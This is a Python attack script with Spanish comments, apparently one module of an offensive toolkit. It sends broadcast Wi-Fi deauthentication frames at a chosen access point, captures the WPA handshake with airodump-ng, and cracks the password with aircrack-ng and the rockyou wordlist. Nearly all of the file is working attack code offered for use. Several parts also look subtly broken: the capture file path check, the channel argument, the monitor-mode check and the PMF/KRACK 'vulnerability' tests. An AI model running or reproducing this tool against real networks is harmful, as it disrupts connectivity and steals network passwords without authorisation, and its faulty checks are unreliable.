"""
NODO_SIGNAL_STRIKE - Ataque de desautenticación y cracking de handshake WPA2/WPA3.
"""

import os
import time
import logging
import subprocess
import tempfile
import shutil
from datetime import datetime
from typing import Dict, List
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, RadioTap

# Configuración de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("NOD_SIGNAL_STRIKE")

# Configuración de interfaces y herramientas
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"  # Path por defecto en Kali Linux
DEFAULT_TIMEOUT = 60  # Tiempo de espera para capturar handshake

def execute(input_data: Dict) -> Dict:
    """
    Ejecuta el ataque de desautenticación y cracking de handshake WPA2/WPA3.

    INPUT_INTERFACE:
    {
        "target_bssid": "string",
        "interface": "string"
    }

    OUTPUT_INTERFACE:
    {
        "target_bssid": "string",
        "handshake_captured": "boolean",
        "crack_result": {"password_found": "boolean", "password": "string"},
        "vulnerabilities": ["string"]
    }
    """
    # Validar entrada
    if not all(key in input_data for key in ['target_bssid', 'interface']):
        return {
            "target_bssid": input_data.get('target_bssid', ''),
            "handshake_captured": False,
            "crack_result": {"password_found": False, "password": ""},
            "vulnerabilities": [],
            "error": "Faltan parámetros obligatorios (target_bssid, interface)"
        }

    target_bssid = input_data['target_bssid']
    interface = input_data['interface']

    # Verificar que aircrack-ng esté disponible
    try:
        subprocess.run(['which', 'aircrack-ng'], capture_output=True, check=True)
    except:
        return {
            "target_bssid": target_bssid,
            "handshake_captured": False,
            "crack_result": {"password_found": False, "password": ""},
            "vulnerabilities": [],
            "error": "aircrack-ng no encontrado. Instale la herramienta para continuar."
        }

    # Verificar que la interfaz esté en modo monitor
    try:
        subprocess.run(['iwconfig', interface], capture_output=True, check=True)
    except:
        return {
            "target_bssid": target_bssid,
            "handshake_captured": False,
            "crack_result": {"password_found": False, "password": ""},
            "vulnerabilities": [],
            "error": f"Interfaz {interface} no disponible o no en modo monitor"
        }

    # Crear directorio temporal para guardar el handshake
    temp_dir = tempfile.mkdtemp()
    handshake_file = os.path.join(temp_dir, "handshake.cap")
    wordlist_path = WORDLIST_PATH

    # Verificar que el wordlist exista
    if not os.path.exists(wordlist_path):
        return {
            "target_bssid": target_bssid,
            "handshake_captured": False,
            "crack_result": {"password_found": False, "password": ""},
            "vulnerabilities": [],
            "error": f"Wordlist no encontrado en {wordlist_path}. Especifique una ruta válida."
        }

    # 1. Ataque de desautenticación para capturar handshake
    handshake_captured = False
    vulnerabilities = []

    try:
        logger.info(f"🔥 Iniciando ataque de desautenticación contra {target_bssid}")

        # Enviar paquetes de desautenticación
        packets = [
            RadioTap() / Dot11(
                type=0,
                subtype=12,  # Management frame
                addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
                addr2=target_bssid,
                addr3=target_bssid
            ) / Dot11Deauth()
        ]

        # Enviar 10 paquetes de desautenticación
        for _ in range(10):
            sendp(packets, iface=interface, count=1, verbose=0)
            time.sleep(0.1)

        # 2. Capturar paquetes en segundo plano
        logger.info("📡 Capturando paquetes en segundo plano...")
        capture_process = subprocess.Popen(
            ['airodump-ng', '-c', '0', '--bssid', target_bssid, '-w', temp_dir, interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Esperar a capturar el handshake (máximo 60 segundos)
        start_time = time.time()
        while time.time() - start_time < DEFAULT_TIMEOUT:
            # Verificar si se ha capturado un handshake
            if os.path.exists(handshake_file + '-01.cap'):
                handshake_captured = True
                logger.info("🔑 Handshake capturado exitosamente")
                break

            time.sleep(1)

        # Terminar captura
        capture_process.terminate()

        # 3. Analizar vulnerabilidades de la red
        logger.info("🔍 Analizando configuración de la red...")

        # Verificar PMF (Protected Management Frames)
        try:
            result = subprocess.run(
                ['aireplay-ng', '-9', target_bssid, interface],
                capture_output=True,
                text=True,
                timeout=10
            )

            if "PMF" in result.stderr:
                vulnerabilities.append("PMF (Protected Management Frames) habilitado")
            else:
                vulnerabilities.append("PMF (Protected Management Frames) deshabilitado - vulnerable a KRACK")

            # Verificar MFP (Management Frame Protection)
            if "MFP" in result.stderr:
                vulnerabilities.append("MFP (Management Frame Protection) habilitado")
            else:
                vulnerabilities.append("MFP (Management Frame Protection) deshabilitado - vulnerable a ataques de downgrade")

        except Exception as e:
            logger.debug(f"Error al analizar configuración de red: {e}")

        # 4. Intentar crackear el handshake si fue capturado
        crack_result = {"password_found": False, "password": ""}

        if handshake_captured:
            logger.info("🔓 Intentando crackear el handshake con aircrack-ng...")

            # Obtener el archivo de handshake (el primero encontrado)
            handshake_files = [f for f in os.listdir(temp_dir) if f.endswith('.cap')]
            if handshake_files:
                handshake_path = os.path.join(temp_dir, handshake_files[0])

                # Ejecutar aircrack-ng
                crack_process = subprocess.Popen(
                    ['aircrack-ng', '-w', wordlist_path, '-b', target_bssid, handshake_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )

                # Leer salida en tiempo real
                for line in crack_process.stderr:
                    if "KEY FOUND!" in line:
                        crack_result["password_found"] = True
                        crack_result["password"] = line.split("KEY: ")[1].strip()
                        logger.info(f"🔑 Contraseña encontrada: {crack_result['password']}")
                        break

                crack_process.terminate()

    except Exception as e:
        logger.error(f"Error durante la ejecución: {e}")
    finally:
        # Limpiar directorio temporal
        shutil.rmtree(temp_dir)

    return {
        "target_bssid": target_bssid,
        "handshake_captured": handshake_captured,
        "crack_result": crack_result,
        "vulnerabilities": vulnerabilities
    }

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="NOD_SIGNAL_STRIKE - Ataque de desautenticación y cracking de handshake")
    parser.add_argument("target_bssid", help="Dirección MAC del punto de acceso objetivo")
    parser.add_argument("interface", help="Interfaz Wi-Fi en modo monitor")
    args = parser.parse_args()

    input_data = {
        "target_bssid": args.target_bssid,
        "interface": args.interface
    }

    result = execute(input_data)
    print(result)